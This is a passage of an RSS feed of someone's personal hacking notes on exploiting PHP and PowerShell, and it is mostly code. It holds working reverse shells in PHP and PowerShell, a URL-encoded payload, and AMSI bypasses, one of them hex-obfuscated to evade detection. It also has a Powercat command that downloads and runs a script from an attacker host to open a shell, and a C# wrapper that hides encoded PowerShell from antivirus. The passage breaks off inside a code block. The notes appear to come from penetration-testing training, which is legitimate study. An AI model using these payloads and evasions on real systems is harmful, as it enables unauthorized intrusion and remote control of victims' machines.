id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;&lt;p&gt;Check out &lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt; on Kali Linux. Note that this only works on UNIX-like systems.&lt;/p&gt;&lt;p&gt;Alternately, a &lt;em&gt;very&lt;/em&gt; simple shell (suitable for running at the command line):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode php&quot;&gt;&lt;code class=&quot;sourceCode php&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;$attacker_ip&lt;/span&gt; = &lt;span class=&quot;st&quot;&gt;&amp;quot;10.0.0.1&amp;quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;$attacker_port&lt;/span&gt; = &lt;span class=&quot;dv&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;$sock&lt;/span&gt; = &lt;span class=&quot;fu&quot;&gt;fsockopen&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;$attacker_ip&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;$attacker_port&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-5&quot;&gt;&lt;a href=&quot;#cb5-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-6&quot;&gt;&lt;a href=&quot;#cb5-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Catch it with netcat or socat.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netcat%22.md&quot;&gt;Using &quot;netcat&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22socat%22.md&quot;&gt;Using &quot;socat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20PHP.md</guid>
		</item>
		<item>
			<title>Exploiting PowerShell</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20PowerShell.md</link>
			<description>&lt;p&gt;The PowerShell execution policy can be bypassed on a case-by-case basis using &lt;code&gt;-ex bypass&lt;/code&gt;; for example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;powershell -bypass -File &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this will not bypass other protections, in particular AMSI!&lt;/p&gt;&lt;h3 id=&quot;additional-resources&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;disable-amsi&quot;&gt;Disable AMSI&lt;/h2&gt;&lt;p&gt;Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of &lt;code&gt;IEX&lt;/code&gt; for in-memory scripts!).&lt;/p&gt;&lt;p&gt;One bypass for this:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;[REF].&lt;span class=&quot;fu&quot;&gt;Assembly&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;GetType&lt;/span&gt;(&amp;#39;System.&lt;span class=&quot;fu&quot;&gt;Management&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Automation&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;AmsiUtils&lt;/span&gt;&amp;#39;).&lt;span class=&quot;fu&quot;&gt;GetField&lt;/span&gt;(&amp;#39;amsiInitFailed&amp;#39;,&amp;#39;NonPublic,Static&amp;#39;).&lt;span class=&quot;fu&quot;&gt;SetValue&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$null&lt;/span&gt;,&lt;span class=&quot;va&quot;&gt;$true&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;[REF].&lt;span class=&quot;fu&quot;&gt;Assembly&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;GetType&lt;/span&gt;(&amp;#39;System.&lt;span class=&quot;fu&quot;&gt;Management&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Automation&lt;/span&gt;.&amp;#39;+$(&lt;span class=&quot;st&quot;&gt;&amp;quot;41 6D 73 69 55 74 69 6C 73&amp;quot;&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Split&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{[&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;]([convert]::toint16(&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;,16))}|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{&lt;span class=&quot;va&quot;&gt;$result&lt;/span&gt;=&lt;span class=&quot;va&quot;&gt;$result&lt;/span&gt;+&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;};&lt;span class=&quot;va&quot;&gt;$result&lt;/span&gt;)).&lt;span class=&quot;fu&quot;&gt;GetField&lt;/span&gt;($(&lt;span class=&quot;st&quot;&gt;&amp;quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&amp;quot;&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Split&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{[&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;]([convert]::toint16(&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;,16))}|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{&lt;span class=&quot;va&quot;&gt;$result2&lt;/span&gt;=&lt;span class=&quot;va&quot;&gt;$result2&lt;/span&gt;+&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;};&lt;span class=&quot;va&quot;&gt;$result2&lt;/span&gt;),&amp;#39;NonPublic,Static&amp;#39;).&lt;span class=&quot;fu&quot;&gt;SetValue&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$null&lt;/span&gt;,&lt;span class=&quot;va&quot;&gt;$true&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Be aware that AMSI bypasses are &lt;em&gt;per session&lt;/em&gt;, not global!&lt;/p&gt;&lt;h3 id=&quot;additional-resources-1&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/&quot;&gt;Bypass AMSI by manual modification&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;pure-powershell-reverse-shell&quot;&gt;Pure PowerShell Reverse Shell&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$client&lt;/span&gt; = &lt;span class=&quot;fu&quot;&gt;New-Object&lt;/span&gt; System.&lt;span class=&quot;fu&quot;&gt;Net&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Sockets&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;TCPClient&lt;/span&gt;(&amp;#39;&amp;lt;IP&amp;gt;&amp;#39;, &amp;lt;PORT&amp;gt;);&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$stream&lt;/span&gt; = &lt;span class=&quot;va&quot;&gt;$client&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;GetStream&lt;/span&gt;();&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;[&lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[]]&lt;span class=&quot;va&quot;&gt;$bytes&lt;/span&gt; = 0..&lt;span class=&quot;fu&quot;&gt;65535&lt;/span&gt; | %{0};&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; (( &lt;span class=&quot;va&quot;&gt;$i&lt;/span&gt; = &lt;span class=&quot;va&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Read&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$bytes&lt;/span&gt;, 0, &lt;span class=&quot;va&quot;&gt;$bytes&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Length&lt;/span&gt;) ) -ne 0) {&lt;/span&gt;
&lt;span id=&quot;cb4-5&quot;&gt;&lt;a href=&quot;#cb4-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$data&lt;/span&gt; = (&lt;span class=&quot;fu&quot;&gt;New-Object&lt;/span&gt; -TypeName System.&lt;span class=&quot;fu&quot;&gt;Text&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ASCIIEncoding&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;GetString&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$bytes&lt;/span&gt;, 0, &lt;span class=&quot;va&quot;&gt;$i&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb4-6&quot;&gt;&lt;a href=&quot;#cb4-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$sendback&lt;/span&gt; = ( &lt;span class=&quot;fu&quot;&gt;iex&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$data&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;fu&quot;&gt;Out-String&lt;/span&gt; );&lt;/span&gt;
&lt;span id=&quot;cb4-7&quot;&gt;&lt;a href=&quot;#cb4-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$sendback2&lt;/span&gt; = &lt;span class=&quot;va&quot;&gt;$sendback&lt;/span&gt; + &amp;#39;PS &amp;#39; + (&lt;span class=&quot;fu&quot;&gt;pwd&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;Path&lt;/span&gt; + &amp;#39;&amp;gt; &amp;#39;;&lt;/span&gt;
&lt;span id=&quot;cb4-8&quot;&gt;&lt;a href=&quot;#cb4-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$sendbyte&lt;/span&gt; = ( [text.&lt;span class=&quot;fu&quot;&gt;encoding&lt;/span&gt;]::ASCII ).&lt;span class=&quot;fu&quot;&gt;GetBytes&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$sendback2&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb4-9&quot;&gt;&lt;a href=&quot;#cb4-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Write&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$sendbyte&lt;/span&gt;, 0, &lt;span class=&quot;va&quot;&gt;$sendbyte&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Length&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb4-10&quot;&gt;&lt;a href=&quot;#cb4-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Flush&lt;/span&gt;()&lt;/span&gt;
&lt;span id=&quot;cb4-11&quot;&gt;&lt;a href=&quot;#cb4-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;
&lt;span id=&quot;cb4-12&quot;&gt;&lt;a href=&quot;#cb4-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$client&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Close&lt;/span&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;URL-encoded version (uses &lt;code&gt;powershell -c &quot;$CODE&quot;&lt;/code&gt;):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&amp;lt;IP&amp;gt;%27%2C&amp;lt;PORT&amp;gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that &lt;code&gt;&amp;lt;IP&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;PORT&amp;gt;&lt;/code&gt; need to be appropriately replaced in the above code.&lt;/p&gt;&lt;p&gt;One annoying thing about this reverse shellâ¦ Thereâs no initial prompt, so you have no idea whether youâve connected or not. but as soon as you enter a command (&lt;code&gt;whoami&lt;/code&gt;, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the PHP script times out!&lt;/p&gt;&lt;h3 id=&quot;relevant-tweet&quot;&gt;Relevant Tweet&lt;/h3&gt;&lt;blockquote&gt;&lt;p&gt;Powershell reverse shell back to netcat listener. netcat is not needed on the target box for this technique to work.&lt;/p&gt;&lt;p&gt;â &lt;a href=&quot;https://twitter.com/rootsecdev/status/1487612184498774019&quot;&gt;rootsecdev (Twitter)&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;h3 id=&quot;additional-resources-2&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;powercat&quot;&gt;Powercat&lt;/h2&gt;&lt;p&gt;A slightly more powerful tool than the previous example is Powercat, which is a reimplementation of nectar in pure PowerShell. Powercat can be installed in Kali Linux using &lt;code&gt;sudo apt install powercat&lt;/code&gt;; the script can be found at &lt;code&gt;/usr/share/windows-resources/powercat/powercat.ps1&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;To execute:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;powershell -c &lt;span class=&quot;st&quot;&gt;&amp;quot;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://$ATTACKER_IP:$ATTACKER_DOWNLOAD_PORT/powercat.ps1&amp;#39;);powercat -c $ATTACKER_IP -p $ATTACKER_PORT -e cmd&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that &lt;code&gt;-ex bypass&lt;/code&gt; &lt;em&gt;isnât&lt;/em&gt; necessary when executing code directly with &lt;code&gt;-c&lt;/code&gt;.&lt;/p&gt;&lt;h3 id=&quot;additional-resources-3&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/besimorhino/powercat&quot;&gt;besimorhino / powercat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;compile-c-programs-to-bypass-anti-virus&quot;&gt;Compile C# Programs to Bypass Anti Virus&lt;/h2&gt;&lt;p&gt;C# can be used to bypass AV (at least as of September 2022) - just create a C# wrapper that fires up a PowerShell one-liner. (Sometimes this will need to be modified slightly to bypass AV, but generally you donât have to tweak this code much - C# analysis doesnât seem to be particularly robust for most AV products.)&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode c#&quot;&gt;&lt;code class=&quot;sourceCode cs&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;using&lt;/span&gt; System;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;namespace&lt;/span&gt; Game&lt;/span&gt;
&lt;span id=&quot;cb7-3&quot;&gt;&lt;a href=&quot;#cb7-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;{&lt;/span&gt;
&lt;span id=&quot;cb7-4&quot;&gt;&lt;a href=&quot;#cb7-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; Program&lt;/span&gt;
&lt;span id=&quot;cb7-5&quot;&gt;&lt;a href=&quot;#cb7-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    {&lt;/span&gt;
&lt;span id=&quot;cb7-6&quot;&gt;&lt;a href=&quot;#cb7-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;Main&lt;/span&gt;() {&lt;/span&gt;
&lt;span id=&quot;cb7-7&quot;&gt;&lt;a href=&quot;#cb7-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            System.&lt;span class=&quot;fu&quot;&gt;Diagnostics&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Process&lt;/span&gt; P = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; System.&lt;span class=&quot;fu&quot;&gt;Diagnostics&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Process&lt;/span&gt;();&lt;/span&gt;
&lt;span id=&quot;cb7-8&quot;&gt;&lt;a href=&quot;#cb7-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            System.&lt;span class=&quot;fu&quot;&gt;Diagnostics&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ProcessStartInfo&lt;/span&gt; SI = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; System.&lt;span class=&quot;fu&quot;&gt;Diagnostics&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ProcessStartInfo&lt;/span&gt;();&lt;/span&gt;
&lt;span id=&quot;cb7-9&quot;&gt;&lt;a href=&quot;#cb7-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            SI.&lt;span class=&quot;fu&quot;&gt;WindowStyle&lt;/span&gt; = System.&lt;span class=&quot;fu&quot;&gt;Diagnostics&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ProcessWindowStyle&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Hidden&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb7-10&quot;&gt;&lt;a href=&quot;#cb7-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            SI.&lt;span class=&quot;fu&quot;&gt;FileName&lt;/span&gt; = &lt;span class=&quot;st&quot;&gt;&amp;quot;powershell.exe&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb7-11&quot;&gt;&lt;a href=&quot;#cb7-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            SI.&lt;span class=&quot;fu&quot;&gt;Arguments&lt;/span&gt; = &lt;span class=&quot;st&quot;&gt;&amp;quot;-enc $BASE64_ENCODED_SCRIPT_TO_RUN&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb7-12&quot;&gt;&lt;a href=&quot;#cb7-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            P.&lt;span class=&quot;fu&quot;&gt;StartInfo&lt;/span&gt; = SI;&lt;/span&gt;
&lt;span id=&quot;cb7-13&quot;&gt;&lt;a href=&quot;#cb7-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            P.&lt;span class=&quot;fu&quot;&gt;Start&lt;/span&gt;();&lt;/span&gt;
&lt;span id=&quot;cb7-14&quot;&gt;&lt;a href=&quot;#cb7-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        }&lt;/span&gt;
&lt;span id=&quot;cb7-15&quot;&gt;&lt;a href=&quot;#cb7-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    }&lt;/span&gt;
&lt;span id=&quot;cb7-16&quot;&gt;&lt;a href=&quot;#cb7-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can be compiled using PowerShell - perhaps even on the target itself. Whatâs the advantage to doing this? You can use Invoke-Mimikatz to run this binary remotely to quickly obtain a remote shell with the permissions of the user youâre impersonating.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$code&lt;/span&gt; = &lt;span class=&quot;vs&quot;&gt;@&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;using System;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;namespace Game&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-4&quot;&gt;&lt;a href=&quot;#cb8-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-5&quot;&gt;&lt;a href=&quot;#cb8-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;    public class Program&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-6&quot;&gt;&lt;a href=&quot;#cb8-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;    {&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-7&quot;&gt;&lt;a href=&quot;#cb8-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;        public static void Main() {&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-8&quot;&gt;&lt;a href=&quot;#cb8-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            System.Diagnostics.Process P = new System.Diagnostics.Process();&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-9&quot;&gt;&lt;a href=&quot;#cb8-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-10&quot;&gt;&lt;a href=&quot;#cb8-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-11&quot;&gt;&lt;a href=&quot;#cb8-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            SI.FileName = &amp;quot;powershell.exe&amp;quot;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-12&quot;&gt;&lt;a href=&quot;#cb8-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            SI.Arguments = &amp;quot;-enc $BASE64_ENCODED_SCRIPT_TO_RUN&amp;quot;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-13&quot;&gt;&lt;a href=&quot;#cb8-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            P.StartInfo = SI;&lt;/span&gt;&lt;/span&gt;
